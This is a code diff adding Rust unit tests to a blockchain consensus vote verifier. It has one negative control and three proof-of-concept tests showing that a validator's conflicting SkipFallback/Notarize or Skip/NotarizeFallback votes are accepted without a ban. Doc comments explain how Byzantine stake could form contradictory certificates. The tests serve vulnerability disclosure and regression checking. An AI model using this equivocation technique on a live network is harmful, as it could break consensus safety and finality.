@@ -2171,4 +2171,349 @@ mod tests {
             .map(|(message, peer_pubkey)| message_to_datagram(message, shred_version, *peer_pubkey))
             .collect()
     }
+
+    /// Negative control: Skip(S) + Notarize(B, S) from the same validator IS correctly
+    /// rejected. This confirms the test infrastructure works and the vulnerability is
+    /// specifically the missing SkipFallback/NotarizeFallback checks.
+    #[test]
+    fn test_negative_control_skip_notarize_correctly_rejected() {
+        let mut ctx = TestContext::new();
+        let shred_version = ctx.verifier.cluster_info.my_shred_version();
+
+        let slot = 42;
+        let block_b = Block {
+            slot,
+            block_id: Hash::new_unique(),
+        };
+
+        // Validator 0 votes Skip(42)
+        let skip_vote = Vote::new_skip_vote(slot);
+        let skip_msg = ConsensusMessage::Vote(create_signed_vote_message(
+            &ctx.verifier.sharable_banks.root(),
+            &ctx.validator_keypairs,
+            shred_version,
+            skip_vote,
+            0,
+        ));
+        let skip_dg = message_to_datagram(
+            &skip_msg,
+            shred_version,
+            ctx.validator_keypairs[0].node_keypair.pubkey(),
+        );
+
+        // SAME validator 0 votes Notarize(B, 42)
+        // CORRECTLY REJECTED: Skip handler checks notar, Notarize handler checks skip
+        let notar_vote = Vote::new_notarization_vote(block_b);
+        let notar_msg = ConsensusMessage::Vote(create_signed_vote_message(
+            &ctx.verifier.sharable_banks.root(),
+            &ctx.validator_keypairs,
+            shred_version,
+            notar_vote,
+            0,
+        ));
+        let notar_dg = message_to_datagram(
+            &notar_msg,
+            shred_version,
+            ctx.validator_keypairs[0].node_keypair.pubkey(),
+        );
+
+        ctx.verifier
+            .verify_and_send_datagrams(vec![skip_dg, notar_dg])
+            .unwrap();
+
+        let batches = ctx.pool_receiver.try_iter().collect::<Vec<_>>();
+
+        // Only the first vote (Skip) should be accepted; Notarize should be rejected
+        let mut found_skip = false;
+        let mut found_notar = false;
+        for batch in &batches {
+            if let SigVerifiedBatch::Votes(aggregates) = batch {
+                for agg in aggregates {
+                    match agg.vote() {
+                        Vote::Skip(s) if s.slot == slot => found_skip = true,
+                        Vote::Notarize(n) if n.block == block_b => found_notar = true,
+                        _ => {}
+                    }
+                }
+            }
+        }
+
+        assert!(found_skip, "Skip vote should be accepted (first vote)");
+        assert!(
+            !found_notar,
+            "Notarize vote from same validator should be rejected \
+             (skip[0] is set) — correctly detected"
+        );
+    }
+
+    /// POC for AGL-eq1: Missing SkipFallback↔Notarize conflict check allows
+    /// equivocating votes that should be rejected, enabling contradictory
+    /// certificates (Skip + Notarize) at the same slot.
+    ///
+    /// Root cause: In bls-sigverify/src/vote_pool.rs, the SkipFallback handler
+    /// does not check `notar[rank]` and the Notarize handler does not check
+    /// `skip_fallback[rank]`. Therefore a validator can successfully vote both
+    /// SkipFallback(S) AND Notarize(B, S) at the same slot without being
+    /// flagged as equivocating or banned.
+    ///
+    /// Impact: A Byzantine validator's stake is counted toward both a Skip
+    /// certificate and a Notarize certificate. With 20% Byzantine stake split
+    /// across SkipFallback + Notarize, plus 40% honest Skip and 40% honest
+    /// Notarize, both Skip(S) and Notarize(B,S) certs can form at the same slot.
+    /// With 40% Byzantine, FinalizeFast(B,S) also forms → finalized block at
+    /// a skip-certified slot.
+    #[test]
+    fn test_poc_skipfallback_notarize_equivocation_accepted() {
+        let mut ctx = TestContext::new();
+        let shred_version = ctx.verifier.cluster_info.my_shred_version();
+
+        let slot = 42;
+        let block_b = Block {
+            slot,
+            block_id: Hash::new_unique(),
+        };
+
+        // ---------------------------------------------------------------
+        // Step 1: Validator 0 votes SkipFallback(42).
+        // The SlotEntry records skip_fallback[0] = true.
+        // ---------------------------------------------------------------
+        let skip_fb_vote = Vote::new_skip_fallback_vote(slot);
+        let skip_fb_msg = ConsensusMessage::Vote(create_signed_vote_message(
+            &ctx.verifier.sharable_banks.root(),
+            &ctx.validator_keypairs,
+            shred_version,
+            skip_fb_vote,
+            0,
+        ));
+        let skip_fb_dg = message_to_datagram(
+            &skip_fb_msg,
+            shred_version,
+            ctx.validator_keypairs[0].node_keypair.pubkey(),
+        );
+
+        // ---------------------------------------------------------------
+        // Step 2: SAME validator 0 votes Notarize(B, 42).
+        // BUG: The Notarize handler does NOT check skip_fallback[rank].
+        // This vote should be rejected as equivocation but is accepted.
+        // ---------------------------------------------------------------
+        let notar_vote = Vote::new_notarization_vote(block_b);
+        let notar_msg = ConsensusMessage::Vote(create_signed_vote_message(
+            &ctx.verifier.sharable_banks.root(),
+            &ctx.validator_keypairs,
+            shred_version,
+            notar_vote,
+            0,
+        ));
+        let notar_dg = message_to_datagram(
+            &notar_msg,
+            shred_version,
+            ctx.validator_keypairs[0].node_keypair.pubkey(),
+        );
+
+        // Submit both votes in the same batch
+        ctx.verifier
+            .verify_and_send_datagrams(vec![skip_fb_dg, notar_dg])
+            .unwrap();
+
+        // Collect verified batches
+        let batches = ctx.pool_receiver.try_iter().collect::<Vec<_>>();
+
+        // ---------------------------------------------------------------
+        // Step 3: Both votes are accepted and forwarded to the consensus pool.
+        // ---------------------------------------------------------------
+        let mut found_skip_fb = false;
+        let mut found_notar = false;
+        for batch in &batches {
+            if let SigVerifiedBatch::Votes(aggregates) = batch {
+                for agg in aggregates {
+                    match agg.vote() {
+                        Vote::SkipFallback(s) if s.slot == slot => found_skip_fb = true,
+                        Vote::Notarize(n) if n.block == block_b => found_notar = true,
+                        _ => {}
+                    }
+                }
+            }
+        }
+
+        assert!(
+            found_skip_fb,
+            "SkipFallback vote should be accepted (first vote, no conflict)"
+        );
+        assert!(
+            found_notar,
+            "BUG: Notarize vote from same validator should have been rejected \
+             as equivocation (skip_fallback[0] is set) but was accepted"
+        );
+
+        // ---------------------------------------------------------------
+        // Step 4: The equivocating validator is NOT banned.
+        // ---------------------------------------------------------------
+        let banned = ctx.banned_pubkeys();
+        assert!(
+            !banned.contains(&ctx.validator_keypairs[0].node_keypair.pubkey()),
+            "BUG: Equivocating validator was not banned for \
+             SkipFallback + Notarize at the same slot"
+        );
+    }
+
+    /// POC for AGL-eq2: Reverse direction — Notarize first, then SkipFallback
+    /// from the same validator at the same slot. Also accepted due to missing
+    /// bidirectional conflict check.
+    #[test]
+    fn test_poc_notarize_skipfallback_equivocation_accepted() {
+        let mut ctx = TestContext::new();
+        let shred_version = ctx.verifier.cluster_info.my_shred_version();
+
+        let slot = 42;
+        let block_b = Block {
+            slot,
+            block_id: Hash::new_unique(),
+        };
+
+        // Validator 0 votes Notarize(B, 42) first
+        let notar_vote = Vote::new_notarization_vote(block_b);
+        let notar_msg = ConsensusMessage::Vote(create_signed_vote_message(
+            &ctx.verifier.sharable_banks.root(),
+            &ctx.validator_keypairs,
+            shred_version,
+            notar_vote,
+            0,
+        ));
+        let notar_dg = message_to_datagram(
+            &notar_msg,
+            shred_version,
+            ctx.validator_keypairs[0].node_keypair.pubkey(),
+        );
+
+        // SAME validator 0 then votes SkipFallback(42)
+        // BUG: SkipFallback handler does NOT check notar[rank]
+        let skip_fb_vote = Vote::new_skip_fallback_vote(slot);
+        let skip_fb_msg = ConsensusMessage::Vote(create_signed_vote_message(
+            &ctx.verifier.sharable_banks.root(),
+            &ctx.validator_keypairs,
+            shred_version,
+            skip_fb_vote,
+            0,
+        ));
+        let skip_fb_dg = message_to_datagram(
+            &skip_fb_msg,
+            shred_version,
+            ctx.validator_keypairs[0].node_keypair.pubkey(),
+        );
+
+        ctx.verifier
+            .verify_and_send_datagrams(vec![notar_dg, skip_fb_dg])
+            .unwrap();
+
+        let batches = ctx.pool_receiver.try_iter().collect::<Vec<_>>();
+
+        let mut found_skip_fb = false;
+        let mut found_notar = false;
+        for batch in &batches {
+            if let SigVerifiedBatch::Votes(aggregates) = batch {
+                for agg in aggregates {
+                    match agg.vote() {
+                        Vote::SkipFallback(s) if s.slot == slot => found_skip_fb = true,
+                        Vote::Notarize(n) if n.block == block_b => found_notar = true,
+                        _ => {}
+                    }
+                }
+            }
+        }
+
+        assert!(
+            found_notar,
+            "Notarize vote should be accepted (first vote, no conflict)"
+        );
+        assert!(
+            found_skip_fb,
+            "BUG: SkipFallback vote from same validator should have been rejected \
+             as equivocation (notar[0] is set) but was accepted"
+        );
+
+        let banned = ctx.banned_pubkeys();
+        assert!(
+            !banned.contains(&ctx.validator_keypairs[0].node_keypair.pubkey()),
+            "BUG: Equivocating validator was not banned"
+        );
+    }
+
+    /// POC for AGL-eq3: Skip + NotarizeFallback from the same validator.
+    /// The Skip handler does NOT check notar_fallback[rank] and the
+    /// NotarizeFallback handler does NOT check skip[rank].
+    #[test]
+    fn test_poc_skip_notarizefallback_equivocation_accepted() {
+        let mut ctx = TestContext::new();
+        let shred_version = ctx.verifier.cluster_info.my_shred_version();
+
+        let slot = 42;
+        let block_b = Block {
+            slot,
+            block_id: Hash::new_unique(),
+        };
+
+        // Validator 0 votes Skip(42) first
+        let skip_vote = Vote::new_skip_vote(slot);
+        let skip_msg = ConsensusMessage::Vote(create_signed_vote_message(
+            &ctx.verifier.sharable_banks.root(),
+            &ctx.validator_keypairs,
+            shred_version,
+            skip_vote,
+            0,
+        ));
+        let skip_dg = message_to_datagram(
+            &skip_msg,
+            shred_version,
+            ctx.validator_keypairs[0].node_keypair.pubkey(),
+        );
+
+        // SAME validator 0 then votes NotarizeFallback(B, 42)
+        // BUG: NotarizeFallback handler does NOT check skip[rank]
+        let nf_vote = Vote::new_notarization_fallback_vote(block_b);
+        let nf_msg = ConsensusMessage::Vote(create_signed_vote_message(
+            &ctx.verifier.sharable_banks.root(),
+            &ctx.validator_keypairs,
+            shred_version,
+            nf_vote,
+            0,
+        ));
+        let nf_dg = message_to_datagram(
+            &nf_msg,
+            shred_version,
+            ctx.validator_keypairs[0].node_keypair.pubkey(),
+        );
+
+        ctx.verifier
+            .verify_and_send_datagrams(vec![skip_dg, nf_dg])
+            .unwrap();
+
+        let batches = ctx.pool_receiver.try_iter().collect::<Vec<_>>();
+
+        let mut found_skip = false;
+        let mut found_nf = false;
+        for batch in &batches {
+            if let SigVerifiedBatch::Votes(aggregates) = batch {
+                for agg in aggregates {
+                    match agg.vote() {
+                        Vote::Skip(s) if s.slot == slot => found_skip = true,
+                        Vote::NotarizeFallback(n) if n.block == block_b => found_nf = true,
+                        _ => {}
+                    }
+                }
+            }
+        }
+
+        assert!(found_skip, "Skip vote should be accepted (first vote)");
+        assert!(
+            found_nf,
+            "BUG: NotarizeFallback vote from same validator should have been \
+             rejected as equivocation (skip[0] is set) but was accepted"
+        );
+
+        let banned = ctx.banned_pubkeys();
+        assert!(
+            !banned.contains(&ctx.validator_keypairs[0].node_keypair.pubkey()),
+            "BUG: Equivocating validator was not banned"
+        );
+    }
 }
